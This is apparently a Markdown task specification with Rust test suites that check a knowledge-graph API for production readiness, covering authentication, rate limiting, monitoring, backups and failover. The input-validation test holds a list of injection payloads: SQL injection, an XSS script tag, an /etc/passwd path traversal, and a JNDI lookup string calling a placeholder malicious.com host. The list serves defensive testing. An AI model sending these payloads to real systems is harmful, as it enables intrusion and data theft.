# Task 35: Production Readiness Validation

**Estimated Time**: 15-20 minutes  
**Dependencies**: 34_concurrent_access_tests.md  
**Stage**: Integration & Testing  

## Objective
Conduct final production readiness validation to ensure Phase 3 knowledge graph system meets all requirements for deployment, including security, monitoring, error handling, documentation completeness, and operational procedures for a production environment.

## Specific Requirements

### 1. Security and Access Control Validation
- Verify authentication and authorization mechanisms work correctly
- Test input validation and sanitization for all API endpoints
- Validate secure handling of sensitive data and credentials
- Test resistance to common security vulnerabilities (SQL injection, etc.)

### 2. Monitoring and Observability
- Validate comprehensive logging and metrics collection
- Test alerting systems for critical failures and performance degradation
- Verify health checks and status reporting accuracy
- Test distributed tracing for complex operations

### 3. Error Handling and Recovery
- Test graceful degradation under various failure scenarios
- Validate error recovery and retry mechanisms
- Test data backup and restoration procedures
- Verify disaster recovery capabilities

### 4. Documentation and Operational Procedures
- Validate comprehensive API documentation
- Test deployment and configuration procedures
- Verify monitoring and maintenance documentation
- Test troubleshooting guides and runbooks

## Implementation Steps

### 1. Create Security Validation Test Suite
```rust
// tests/production/security_tests.rs
use std::sync::Arc;
use axum::http::StatusCode;
use tower::ServiceExt;
use serde_json::json;

use llmkg::api::rest_server::{create_rest_router, ApiState};
use llmkg::core::brain_enhanced_graph::BrainEnhancedGraphCore;

#[tokio::test]
async fn test_authentication_and_authorization() {
    let app_state = setup_production_api_state().await;
    let app = create_rest_router(app_state);
    
    println!("🔐 Testing authentication and authorization...");
    
    // Test unauthenticated request should be rejected
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("content-type", "application/json")
        .body(json!({
            "concept_id": "test_concept",
            "concept_type": "Episodic",
            "content": "Test content"
        }).to_string())
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED, 
              "Unauthenticated request should be rejected");
    
    // Test invalid token should be rejected
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("authorization", "Bearer invalid_token_12345")
        .header("content-type", "application/json")
        .body(json!({
            "concept_id": "test_concept",
            "concept_type": "Episodic", 
            "content": "Test content"
        }).to_string())
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED,
              "Invalid token should be rejected");
    
    // Test valid token should be accepted
    let valid_token = generate_test_jwt_token().await;
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("authorization", &format!("Bearer {}", valid_token))
        .header("content-type", "application/json")
        .body(json!({
            "concept_id": "auth_test_concept",
            "concept_type": "Episodic",
            "content": "Authenticated test content"
        }).to_string())
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert!(response.status().is_success() || response.status().is_client_error(),
           "Valid token should not result in authentication error");
    
    // Test rate limiting
    let mut rate_limit_exceeded = false;
    for i in 0..150 { // Exceed rate limit of 100 requests per minute
        let request = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/health")
            .header("authorization", &format!("Bearer {}", valid_token))
            .body(String::new())
            .unwrap();
        
        let response = app.clone().oneshot(request).await.unwrap();
        if response.status() == StatusCode::TOO_MANY_REQUESTS {
            rate_limit_exceeded = true;
            println!("✓ Rate limiting triggered after {} requests", i + 1);
            break;
        }
    }
    
    assert!(rate_limit_exceeded, "Rate limiting should be enforced");
    
    println!("✓ Authentication and authorization tests passed");
}

#[tokio::test]
async fn test_input_validation_and_sanitization() {
    let app_state = setup_production_api_state().await;
    let app = create_rest_router(app_state);
    let valid_token = generate_test_jwt_token().await;
    
    println!("🛡️ Testing input validation and sanitization...");
    
    // Test empty concept_id should be rejected
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("authorization", &format!("Bearer {}", valid_token))
        .header("content-type", "application/json")
        .body(json!({
            "concept_id": "",
            "concept_type": "Episodic",
            "content": "Test content"
        }).to_string())
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::BAD_REQUEST,
              "Empty concept_id should be rejected");
    
    // Test excessively long content should be rejected
    let oversized_content = "x".repeat(2_000_000); // 2MB content
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("authorization", &format!("Bearer {}", valid_token))
        .header("content-type", "application/json")
        .body(json!({
            "concept_id": "size_test_concept",
            "concept_type": "Episodic",
            "content": oversized_content
        }).to_string())
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::BAD_REQUEST,
              "Oversized content should be rejected");
    
    // Test SQL injection attempts in search queries
    let injection_payloads = vec![
        "'; DROP TABLE concepts; --",
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://malicious.com/a}",
    ];
    
    for payload in injection_payloads {
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/search/semantic")
            .header("authorization", &format!("Bearer {}", valid_token))
            .header("content-type", "application/json")
            .body(json!({
                "query": payload,
                "limit": 10
            }).to_string())
            .unwrap();
        
        let response = app.clone().oneshot(request).await.unwrap();
        // Should either sanitize the input or return an error, but not crash
        assert!(response.status().is_client_error() || response.status().is_success(),
               "Injection payload '{}' caused server error", payload);
    }
    
    // Test invalid JSON should be rejected gracefully
    let request = axum::http::Request::builder()
        .method("POST")
        .uri("/api/v1/memory/allocate")
        .header("authorization", &format!("Bearer {}", valid_token))
        .header("content-type", "application/json")
        .body("{ invalid json content")
        .unwrap();
    
    let response = app.clone().oneshot(request).await.unwrap();
    assert_eq!(response.status(), StatusCode::BAD_REQUEST,
              "Invalid JSON should be rejected");
    
    println!("✓ Input validation and sanitization tests passed");
}

#[tokio::test]
async fn test_data_encryption_and_security() {
    let brain_graph = setup_production_brain_graph().await;
    
    println!("🔒 Testing data encryption and security...");
    
    // Test sensitive data is encrypted at rest
    let sensitive_content = "SECRET_API_KEY=sk-1234567890abcdef CREDIT_CARD=4111-1111-1111-1111";
    
    let allocation_request = MemoryAllocationRequest {
        concept_id: "security_test_concept".to_string(),
        concept_type: ConceptType::Confidential,
        content: sensitive_content.to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::High,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "security_test_user".to_string(),
        request_id: "security_test_req".to_string(),
        version_info: None,
    };
    
    let allocation_result = brain_graph
        .allocate_memory_with_cortical_coordination(allocation_request)
        .await
        .expect("Failed to allocate sensitive concept");
    
    // Verify sensitive data is properly protected
    let stored_concept = brain_graph
        .get_concept(&allocation_result.memory_slot.concept_id.unwrap())
        .await
        .expect("Failed to retrieve stored concept");
    
    // Content should be encrypted or masked when retrieved
    if stored_concept.security_classification == SecurityClassification::Confidential {
        assert!(!stored_concept.content.contains("SECRET_API_KEY"),
               "Sensitive data should be encrypted/masked");
        assert!(!stored_concept.content.contains("4111-1111-1111-1111"),
               "Credit card data should be encrypted/masked");
    }
    
    // Test audit logging for sensitive operations
    let audit_logs = brain_graph
        .get_audit_logs_for_concept(&allocation_result.memory_slot.concept_id.unwrap())
        .await
        .expect("Failed to retrieve audit logs");
    
    assert!(!audit_logs.is_empty(), "Audit logs should be created for sensitive operations");
    
    let creation_log = audit_logs.iter()
        .find(|log| log.operation_type == AuditOperationType::ConceptCreation)
        .expect("Concept creation should be audited");
    
    assert_eq!(creation_log.user_id, "security_test_user");
    assert!(creation_log.timestamp.is_some());
    assert!(!creation_log.details.contains("SECRET_API_KEY"),
           "Audit logs should not contain sensitive data");
    
    println!("✓ Data encryption and security tests passed");
}

async fn setup_production_api_state() -> ApiState {
    let brain_graph = setup_production_brain_graph().await;
    
    ApiState {
        knowledge_graph_service: Arc::new(KnowledgeGraphService::new(brain_graph.clone())),
        allocation_service: Arc::new(MemoryAllocationService::new(brain_graph.clone())),
        retrieval_service: Arc::new(MemoryRetrievalService::new(brain_graph.clone())),
        auth_service: Arc::new(AuthenticationService::new_for_production()),
        rate_limiter: Arc::new(RateLimiter::new_for_production()),
    }
}

async fn generate_test_jwt_token() -> String {
    // Generate a valid test JWT token for authentication tests
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0X3VzZXIiLCJpYXQiOjE2MzA0NzE2MDAsImV4cCI6MTYzMDQ3NTIwMCwidXNlcl9pZCI6InRlc3RfdXNlciIsInJvbGUiOiJ1c2VyIn0.test_signature".to_string()
}
```

### 2. Create Monitoring and Observability Tests
```rust
// tests/production/monitoring_tests.rs
use std::time::Duration;
use tokio::time::timeout;

#[tokio::test]
async fn test_health_checks_and_metrics() {
    let brain_graph = setup_production_brain_graph().await;
    
    println!("📊 Testing health checks and metrics collection...");
    
    // Test basic health check
    let health_status = brain_graph
        .get_health_status()
        .await
        .expect("Failed to get health status");
    
    assert_eq!(health_status.overall_status, HealthStatus::Healthy);
    assert!(health_status.timestamp.is_some());
    assert!(health_status.uptime.as_secs() > 0);
    
    // Test detailed component health
    assert!(health_status.database_health.is_healthy());
    assert!(health_status.cache_health.is_healthy());
    assert!(health_status.phase2_integration_health.is_healthy());
    
    // Test metrics collection
    let system_metrics = brain_graph
        .get_comprehensive_metrics()
        .await
        .expect("Failed to get system metrics");
    
    // Validate allocation metrics
    assert!(system_metrics.allocation_metrics.total_allocations >= 0);
    assert!(system_metrics.allocation_metrics.avg_allocation_time_ms >= 0.0);
    assert!(system_metrics.allocation_metrics.success_rate >= 0.0);
    assert!(system_metrics.allocation_metrics.success_rate <= 1.0);
    
    // Validate retrieval metrics
    assert!(system_metrics.retrieval_metrics.total_searches >= 0);
    assert!(system_metrics.retrieval_metrics.avg_search_time_ms >= 0.0);
    assert!(system_metrics.retrieval_metrics.cache_hit_rate >= 0.0);
    assert!(system_metrics.retrieval_metrics.cache_hit_rate <= 1.0);
    
    // Validate resource metrics
    assert!(system_metrics.resource_metrics.memory_usage_mb > 0);
    assert!(system_metrics.resource_metrics.cpu_usage_percent >= 0.0);
    assert!(system_metrics.resource_metrics.cpu_usage_percent <= 100.0);
    assert!(system_metrics.resource_metrics.active_connections >= 0);
    
    // Test performance degradation detection
    brain_graph.simulate_performance_degradation().await;
    
    let degraded_health = brain_graph
        .get_health_status()
        .await
        .expect("Failed to get degraded health status");
    
    assert_eq!(degraded_health.overall_status, HealthStatus::Degraded);
    
    // Test recovery detection
    brain_graph.restore_normal_performance().await;
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    let recovered_health = brain_graph
        .get_health_status()
        .await
        .expect("Failed to get recovered health status");
    
    assert_eq!(recovered_health.overall_status, HealthStatus::Healthy);
    
    println!("✓ Health checks and metrics tests passed");
}

#[tokio::test]
async fn test_alerting_and_notifications() {
    let brain_graph = setup_production_brain_graph().await;
    let alert_manager = setup_test_alert_manager().await;
    
    println!("🚨 Testing alerting and notification systems...");
    
    // Test critical failure alert
    brain_graph.simulate_critical_failure().await;
    
    // Wait for alert to be triggered
    let alert_triggered = timeout(
        Duration::from_secs(5),
        alert_manager.wait_for_alert(AlertType::CriticalFailure)
    ).await;
    
    assert!(alert_triggered.is_ok(), "Critical failure alert should be triggered");
    
    let alert = alert_triggered.unwrap();
    assert_eq!(alert.severity, AlertSeverity::Critical);
    assert!(alert.message.contains("Critical failure"));
    assert!(alert.timestamp.is_some());
    
    // Test performance degradation alert
    brain_graph.simulate_performance_degradation().await;
    
    let perf_alert = timeout(
        Duration::from_secs(3),
        alert_manager.wait_for_alert(AlertType::PerformanceDegradation)
    ).await;
    
    assert!(perf_alert.is_ok(), "Performance degradation alert should be triggered");
    
    // Test alert recovery
    brain_graph.restore_normal_performance().await;
    
    let recovery_alert = timeout(
        Duration::from_secs(3),
        alert_manager.wait_for_alert(AlertType::SystemRecovery)
    ).await;
    
    assert!(recovery_alert.is_ok(), "System recovery alert should be triggered");
    
    // Test alert throttling (prevent spam)
    for _ in 0..10 {
        brain_graph.simulate_minor_error().await;
    }
    
    let alert_count = alert_manager.get_alert_count_in_last_minute(AlertType::MinorError).await;
    assert!(alert_count <= 3, "Alert throttling should prevent spam, got {} alerts", alert_count);
    
    println!("✓ Alerting and notification tests passed");
}

#[tokio::test]
async fn test_distributed_tracing() {
    let brain_graph = setup_production_brain_graph().await;
    
    println!("🔍 Testing distributed tracing capabilities...");
    
    // Enable tracing for complex operation
    let trace_id = "test_trace_001";
    brain_graph.start_trace(trace_id).await;
    
    // Perform complex operation that spans multiple components
    let allocation_request = MemoryAllocationRequest {
        concept_id: "trace_test_concept".to_string(),
        concept_type: ConceptType::Semantic,
        content: "Content for distributed tracing test".to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::Normal,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "trace_test_user".to_string(),
        request_id: "trace_test_req".to_string(),
        version_info: None,
    };
    
    let allocation_result = brain_graph
        .allocate_memory_with_cortical_coordination(allocation_request)
        .await
        .expect("Failed to allocate memory for tracing test");
    
    let concept_id = allocation_result.memory_slot.concept_id.unwrap();
    
    // Perform search operation
    let search_request = SearchRequest {
        query_text: "distributed tracing test".to_string(),
        search_type: SearchType::Semantic,
        similarity_threshold: Some(0.8),
        limit: Some(5),
        user_context: UserContext::default(),
        use_ttfs_encoding: true,
        cortical_area_filter: None,
    };
    
    let _search_result = brain_graph
        .search_memory_with_semantic_similarity(search_request)
        .await
        .expect("Failed to perform search for tracing test");
    
    // End tracing
    brain_graph.end_trace(trace_id).await;
    
    // Retrieve trace data
    let trace_data = brain_graph
        .get_trace_data(trace_id)
        .await
        .expect("Failed to retrieve trace data");
    
    assert!(!trace_data.spans.is_empty(), "Trace should contain spans");
    
    // Verify allocation span exists
    let allocation_span = trace_data.spans.iter()
        .find(|span| span.operation_name.contains("allocate_memory"))
        .expect("Allocation span should exist in trace");
    
    assert!(allocation_span.duration_ms > 0);
    assert_eq!(allocation_span.trace_id, trace_id);
    assert!(allocation_span.tags.contains_key("concept_id"));
    
    // Verify search span exists
    let search_span = trace_data.spans.iter()
        .find(|span| span.operation_name.contains("search_memory"))
        .expect("Search span should exist in trace");
    
    assert!(search_span.duration_ms > 0);
    assert_eq!(search_span.trace_id, trace_id);
    
    // Verify span relationships (parent-child)
    let parent_spans = trace_data.spans.iter()
        .filter(|span| span.parent_span_id.is_none())
        .count();
    
    assert_eq!(parent_spans, 1, "Should have exactly one root span");
    
    println!("✓ Distributed tracing tests passed");
}

async fn setup_test_alert_manager() -> TestAlertManager {
    TestAlertManager::new()
}

struct TestAlertManager {
    alerts: Arc<tokio::sync::Mutex<Vec<Alert>>>,
}

impl TestAlertManager {
    fn new() -> Self {
        Self {
            alerts: Arc::new(tokio::sync::Mutex::new(Vec::new())),
        }
    }
    
    async fn wait_for_alert(&self, alert_type: AlertType) -> Alert {
        let start_time = std::time::Instant::now();
        let timeout_duration = Duration::from_secs(10);
        
        loop {
            {
                let alerts = self.alerts.lock().await;
                if let Some(alert) = alerts.iter().find(|a| a.alert_type == alert_type) {
                    return alert.clone();
                }
            }
            
            if start_time.elapsed() > timeout_duration {
                panic!("Timeout waiting for alert: {:?}", alert_type);
            }
            
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }
    
    async fn get_alert_count_in_last_minute(&self, alert_type: AlertType) -> usize {
        let alerts = self.alerts.lock().await;
        let cutoff_time = chrono::Utc::now() - chrono::Duration::minutes(1);
        
        alerts.iter()
            .filter(|a| a.alert_type == alert_type && a.timestamp.unwrap() > cutoff_time)
            .count()
    }
}
```

### 3. Create Error Handling and Recovery Tests
```rust
// tests/production/error_recovery_tests.rs
#[tokio::test]
async fn test_graceful_degradation() {
    let brain_graph = setup_production_brain_graph().await;
    
    println!("🛡️ Testing graceful degradation under failures...");
    
    // Test database connection failure
    brain_graph.simulate_database_failure().await;
    
    // System should still accept requests but return appropriate errors
    let allocation_request = MemoryAllocationRequest {
        concept_id: "degradation_test_concept".to_string(),
        concept_type: ConceptType::Episodic,
        content: "Test content during database failure".to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::Normal,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "degradation_test_user".to_string(),
        request_id: "degradation_test_req".to_string(),
        version_info: None,
    };
    
    let result = brain_graph
        .allocate_memory_with_cortical_coordination(allocation_request)
        .await;
    
    // Should return a specific error, not crash
    assert!(result.is_err());
    if let Err(error) = result {
        match error {
            AllocationError::DatabaseUnavailable => {
                // Expected error type
            }
            _ => panic!("Unexpected error type during database failure: {:?}", error),
        }
    }
    
    // Health check should report degraded status
    let health_status = brain_graph.get_health_status().await.unwrap();
    assert_eq!(health_status.overall_status, HealthStatus::Degraded);
    
    // Restore database and verify recovery
    brain_graph.restore_database_connection().await;
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    let recovered_health = brain_graph.get_health_status().await.unwrap();
    assert_eq!(recovered_health.overall_status, HealthStatus::Healthy);
    
    // Test cache failure graceful degradation
    brain_graph.simulate_cache_failure().await;
    
    // Searches should still work but be slower
    let search_request = SearchRequest {
        query_text: "test query during cache failure".to_string(),
        search_type: SearchType::Semantic,
        similarity_threshold: Some(0.8),
        limit: Some(5),
        user_context: UserContext::default(),
        use_ttfs_encoding: false,
        cortical_area_filter: None,
    };
    
    let search_result = brain_graph
        .search_memory_with_semantic_similarity(search_request)
        .await;
    
    // Should still work, just slower
    assert!(search_result.is_ok());
    let result = search_result.unwrap();
    assert!(result.search_time_ms > 50); // Should be slower without cache
    assert!(!result.cache_hit); // No cache hit during failure
    
    brain_graph.restore_cache().await;
    
    println!("✓ Graceful degradation tests passed");
}

#[tokio::test]
async fn test_data_backup_and_restoration() {
    let brain_graph = setup_production_brain_graph().await;
    
    println!("💾 Testing data backup and restoration procedures...");
    
    // Create test data
    let test_concepts = vec![
        "backup_test_concept_1",
        "backup_test_concept_2", 
        "backup_test_concept_3",
    ];
    
    for concept_id in &test_concepts {
        let request = MemoryAllocationRequest {
            concept_id: concept_id.to_string(),
            concept_type: ConceptType::Semantic,
            content: format!("Content for {}", concept_id),
            semantic_embedding: Some(generate_test_embedding(256)),
            priority: AllocationPriority::Normal,
            resource_requirements: ResourceRequirements::default(),
            locality_hints: vec![],
            user_id: "backup_test_user".to_string(),
            request_id: format!("backup_req_{}", concept_id),
            version_info: None,
        };
        
        brain_graph.allocate_memory_with_cortical_coordination(request).await.unwrap();
    }
    
    // Perform backup
    let backup_result = brain_graph
        .create_backup("test_backup_001")
        .await
        .expect("Failed to create backup");
    
    assert!(backup_result.backup_id.len() > 0);
    assert!(backup_result.backup_size_mb > 0);
    assert!(backup_result.concept_count >= test_concepts.len());
    
    // Verify backup integrity
    let backup_integrity = brain_graph
        .verify_backup_integrity(&backup_result.backup_id)
        .await
        .expect("Failed to verify backup integrity");
    
    assert!(backup_integrity.is_valid);
    assert_eq!(backup_integrity.corrupted_files.len(), 0);
    
    // Simulate data corruption/loss
    for concept_id in &test_concepts {
        brain_graph.simulate_data_corruption(concept_id).await;
    }
    
    // Verify data is corrupted
    let corrupted_concept = brain_graph.get_concept(&test_concepts[0]).await;
    assert!(corrupted_concept.is_err() || corrupted_concept.unwrap().content.is_empty());
    
    // Restore from backup
    let restoration_result = brain_graph
        .restore_from_backup(&backup_result.backup_id)
        .await
        .expect("Failed to restore from backup");
    
    assert_eq!(restoration_result.restored_concepts, test_concepts.len());
    assert_eq!(restoration_result.failed_restorations, 0);
    
    // Verify data is restored correctly
    for concept_id in &test_concepts {
        let restored_concept = brain_graph
            .get_concept(concept_id)
            .await
            .expect("Failed to retrieve restored concept");
        
        assert_eq!(restored_concept.concept_id, *concept_id);
        assert_eq!(restored_concept.content, format!("Content for {}", concept_id));
    }
    
    // Test incremental backup
    let new_concept_request = MemoryAllocationRequest {
        concept_id: "incremental_test_concept".to_string(),
        concept_type: ConceptType::Episodic,
        content: "Content for incremental backup test".to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::Normal,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "backup_test_user".to_string(),
        request_id: "incremental_backup_req".to_string(),
        version_info: None,
    };
    
    brain_graph.allocate_memory_with_cortical_coordination(new_concept_request).await.unwrap();
    
    let incremental_backup = brain_graph
        .create_incremental_backup("test_backup_002", &backup_result.backup_id)
        .await
        .expect("Failed to create incremental backup");
    
    assert!(incremental_backup.backup_size_mb < backup_result.backup_size_mb);
    assert!(incremental_backup.concept_count >= 1); // Should contain at least the new concept
    
    println!("✓ Data backup and restoration tests passed");
}

#[tokio::test]
async fn test_disaster_recovery() {
    let primary_brain_graph = setup_production_brain_graph().await;
    let secondary_brain_graph = setup_production_brain_graph().await;
    
    println!("🌪️ Testing disaster recovery capabilities...");
    
    // Setup replication between primary and secondary
    primary_brain_graph
        .setup_replication_to(&secondary_brain_graph)
        .await
        .expect("Failed to setup replication");
    
    // Create data on primary
    let test_concept_id = "disaster_recovery_test";
    let allocation_request = MemoryAllocationRequest {
        concept_id: test_concept_id.to_string(),
        concept_type: ConceptType::Critical,
        content: "Critical data for disaster recovery test".to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::Critical,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "disaster_test_user".to_string(),
        request_id: "disaster_test_req".to_string(),
        version_info: None,
    };
    
    primary_brain_graph
        .allocate_memory_with_cortical_coordination(allocation_request)
        .await
        .expect("Failed to allocate on primary");
    
    // Wait for replication
    tokio::time::sleep(Duration::from_millis(500)).await;
    
    // Verify replication to secondary
    let replicated_concept = secondary_brain_graph
        .get_concept(test_concept_id)
        .await
        .expect("Failed to retrieve replicated concept");
    
    assert_eq!(replicated_concept.concept_id, test_concept_id);
    assert_eq!(replicated_concept.content, "Critical data for disaster recovery test");
    
    // Simulate primary system failure
    primary_brain_graph.simulate_complete_failure().await;
    
    // Promote secondary to primary
    let failover_result = secondary_brain_graph
        .promote_to_primary()
        .await
        .expect("Failed to promote secondary to primary");
    
    assert!(failover_result.promotion_successful);
    assert!(failover_result.data_consistency_verified);
    
    // Verify continued operation on promoted secondary
    let post_failover_concept = secondary_brain_graph
        .get_concept(test_concept_id)
        .await
        .expect("Failed to retrieve concept after failover");
    
    assert_eq!(post_failover_concept.concept_id, test_concept_id);
    
    // Test new allocations work on promoted secondary
    let post_failover_request = MemoryAllocationRequest {
        concept_id: "post_failover_concept".to_string(),
        concept_type: ConceptType::Episodic,
        content: "Content created after failover".to_string(),
        semantic_embedding: Some(generate_test_embedding(256)),
        priority: AllocationPriority::Normal,
        resource_requirements: ResourceRequirements::default(),
        locality_hints: vec![],
        user_id: "disaster_test_user".to_string(),
        request_id: "post_failover_req".to_string(),
        version_info: None,
    };
    
    let post_failover_result = secondary_brain_graph
        .allocate_memory_with_cortical_coordination(post_failover_request)
        .await
        .expect("Failed to allocate after failover");
    
    assert!(post_failover_result.memory_slot.concept_id.is_some());
    
    println!("✓ Disaster recovery tests passed");
}
```

### 4. Create Documentation and Deployment Validation
```rust
// tests/production/documentation_tests.rs
#[tokio::test]
async fn test_api_documentation_completeness() {
    println!("📚 Testing API documentation completeness...");
    
    // Test OpenAPI specification generation
    let openapi_spec = generate_openapi_specification().await
        .expect("Failed to generate OpenAPI specification");
    
    // Verify all endpoints are documented
    let required_endpoints = vec![
        "/api/v1/memory/allocate",
        "/api/v1/memory/retrieve", 
        "/api/v1/search/semantic",
        "/api/v1/concepts/{concept_id}",
        "/api/v1/health",
        "/api/v1/metrics",
    ];
    
    for endpoint in required_endpoints {
        assert!(openapi_spec.paths.contains_key(endpoint),
               "Endpoint {} not documented in OpenAPI spec", endpoint);
        
        let path_item = &openapi_spec.paths[endpoint];
        assert!(path_item.summary.is_some() || path_item.description.is_some(),
               "Endpoint {} missing documentation", endpoint);
    }
    
    // Verify all data models are documented
    let required_models = vec![
        "MemoryAllocationRequest",
        "MemoryAllocationResponse",
        "SearchRequest",
        "SearchResponse",
        "ConceptProperty",
        "ErrorResponse",
    ];
    
    for model in required_models {
        assert!(openapi_spec.components.schemas.contains_key(model),
               "Model {} not documented in OpenAPI spec", model);
    }
    
    // Test GraphQL schema documentation
    let graphql_schema = generate_graphql_schema_documentation().await
        .expect("Failed to generate GraphQL schema documentation");
    
    assert!(graphql_schema.contains("type Concept"));
    assert!(graphql_schema.contains("type Query"));
    assert!(graphql_schema.contains("type Mutation"));
    assert!(graphql_schema.contains("type Subscription"));
    
    println!("✓ API documentation completeness tests passed");
}

#[tokio::test]
async fn test_deployment_procedures() {
    println!("🚀 Testing deployment procedures...");
    
    // Test configuration validation
    let test_config = ProductionConfig {
        database_url: "neo4j://localhost:7687".to_string(),
        redis_url: "redis://localhost:6379".to_string(),
        api_port: 8080,
        log_level: "info".to_string(),
        jwt_secret: "test_secret_key_for_production".to_string(),
        max_connections: 100,
        request_timeout_ms: 30000,
        phase2_integration_enabled: true,
        security_settings: SecuritySettings {
            encryption_enabled: true,
            audit_logging_enabled: true,
            rate_limiting_enabled: true,
            input_validation_enabled: true,
        },
    };
    
    let validation_result = validate_production_config(&test_config)
        .await
        .expect("Failed to validate production config");
    
    assert!(validation_result.is_valid);
    assert_eq!(validation_result.warnings.len(), 0);
    assert_eq!(validation_result.errors.len(), 0);
    
    // Test invalid configuration detection
    let invalid_config = ProductionConfig {
        database_url: "invalid_url".to_string(),
        jwt_secret: "weak".to_string(), // Too short
        max_connections: 0, // Invalid
        ..test_config
    };
    
    let invalid_validation = validate_production_config(&invalid_config)
        .await
        .expect("Failed to validate invalid config");
    
    assert!(!invalid_validation.is_valid);
    assert!(invalid_validation.errors.len() > 0);
    
    // Test dependency verification
    let dependency_check = verify_production_dependencies().await
        .expect("Failed to verify dependencies");
    
    assert!(dependency_check.neo4j_available);
    assert!(dependency_check.redis_available);
    assert!(dependency_check.phase2_components_available);
    
    // Test migration scripts
    let migration_result = run_production_migrations(&test_config).await
        .expect("Failed to run migrations");
    
    assert!(migration_result.migrations_applied > 0);
    assert_eq!(migration_result.failed_migrations.len(), 0);
    
    println!("✓ Deployment procedure tests passed");
}

#[tokio::test]
async fn test_operational_runbooks() {
    println!("📖 Testing operational runbooks and procedures...");
    
    // Test troubleshooting procedures
    let troubleshooting_guide = load_troubleshooting_runbook().await
        .expect("Failed to load troubleshooting runbook");
    
    let required_scenarios = vec![
        "high_memory_usage",
        "slow_response_times",
        "database_connection_failures",
        "phase2_integration_errors",
        "authentication_failures",
    ];
    
    for scenario in required_scenarios {
        assert!(troubleshooting_guide.scenarios.contains_key(scenario),
               "Troubleshooting scenario '{}' not documented", scenario);
        
        let scenario_guide = &troubleshooting_guide.scenarios[scenario];
        assert!(!scenario_guide.symptoms.is_empty(),
               "Scenario '{}' missing symptom descriptions", scenario);
        assert!(!scenario_guide.diagnostic_steps.is_empty(),
               "Scenario '{}' missing diagnostic steps", scenario);
        assert!(!scenario_guide.resolution_steps.is_empty(),
               "Scenario '{}' missing resolution steps", scenario);
    }
    
    // Test monitoring procedures
    let monitoring_runbook = load_monitoring_runbook().await
        .expect("Failed to load monitoring runbook");
    
    assert!(!monitoring_runbook.key_metrics.is_empty());
    assert!(!monitoring_runbook.alert_procedures.is_empty());
    assert!(!monitoring_runbook.escalation_procedures.is_empty());
    
    // Test maintenance procedures
    let maintenance_guide = load_maintenance_runbook().await
        .expect("Failed to load maintenance runbook");
    
    let required_procedures = vec![
        "database_maintenance",
        "cache_cleanup",
        "log_rotation",
        "backup_verification",
        "security_updates",
    ];
    
    for procedure in required_procedures {
        assert!(maintenance_guide.procedures.contains_key(procedure),
               "Maintenance procedure '{}' not documented", procedure);
    }
    
    println!("✓ Operational runbook tests passed");
}

async fn setup_production_brain_graph() -> Arc<BrainEnhancedGraphCore> {
    let cortical_manager = Arc::new(CorticalColumnManager::new_for_production());
    let ttfs_encoder = Arc::new(TTFSEncoder::new_for_production());
    let memory_pool = Arc::new(MemoryPool::new_for_production());
    
    Arc::new(
        BrainEnhancedGraphCore::new_with_phase2_integration(
            cortical_manager,
            ttfs_encoder,
            memory_pool,
        )
        .await
        .expect("Failed to create production brain graph")
    )
}

fn generate_test_embedding(size: usize) -> Vec<f32> {
    (0..size).map(|i| (i as f32) / (size as f32)).collect()
}
```

## Acceptance Criteria

### Functional Requirements
- [ ] Security validation confirms robust authentication and authorization
- [ ] Input validation prevents injection attacks and malformed requests
- [ ] Monitoring systems accurately track health and performance metrics
- [ ] Error handling provides graceful degradation under failures
- [ ] Documentation is comprehensive and up-to-date

### Performance Requirements
- [ ] Health checks respond within 100ms
- [ ] Alerting triggers within 30 seconds of issues
- [ ] Backup operations complete within acceptable time windows
- [ ] Recovery procedures restore service within defined RTOs
- [ ] System maintains performance during monitoring overhead

### Testing Requirements
- [ ] All security tests pass without vulnerabilities
- [ ] Monitoring and alerting systems function correctly
- [ ] Error recovery mechanisms work as designed
- [ ] Documentation validation confirms completeness
- [ ] Deployment procedures execute successfully

## Validation Steps

1. **Run security validation tests**:
   ```bash
   cargo test --test security_tests --release
   ```

2. **Execute monitoring tests**:
   ```bash
   cargo test --test monitoring_tests --release
   ```

3. **Test error recovery procedures**:
   ```bash
   cargo test --test error_recovery_tests --release
   ```

4. **Validate documentation completeness**:
   ```bash
   cargo test --test documentation_tests --release
   ```

5. **Run complete production readiness suite**:
   ```bash
   cargo test --test production_readiness --release
   ```

## Files to Create/Modify
- `tests/production/security_tests.rs` - Security validation tests
- `tests/production/monitoring_tests.rs` - Monitoring and observability tests
- `tests/production/error_recovery_tests.rs` - Error handling and recovery tests
- `tests/production/documentation_tests.rs` - Documentation validation tests
